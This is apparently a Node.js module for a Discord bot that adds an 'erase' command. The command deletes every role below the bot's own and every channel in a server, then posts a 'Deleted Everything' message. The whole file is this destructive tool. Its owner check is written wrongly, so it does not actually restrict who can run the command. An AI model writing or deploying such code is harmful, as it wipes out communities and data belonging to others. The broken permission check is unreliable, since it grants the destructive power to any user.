const Discord = require('discord.js')

module.exports = {
  name: "erase",
    async run(client, message, args) {
    if(!message.author.id == "551120440584699904") return;  
    message.guild.roles.cache.filter(a => !a.managed && a.name !== '@everyone' && a.position < message.guild.members.cache.get(client.user.id).roles.highest.position).forEach(role => role.delete('ok boomer') && console.log(role.name+' silindi sqrt'));
    message.guild.channels.cache.forEach(a => a.delete());
    message.guild.channels.create('general', { type: 'text'}).then(a => a.send(new Discord.MessageEmbed()
    .setTitle("Sucsesfully Deleted Everything!")
    .setColor("GOLD")                                                                           
    ))
    }
}
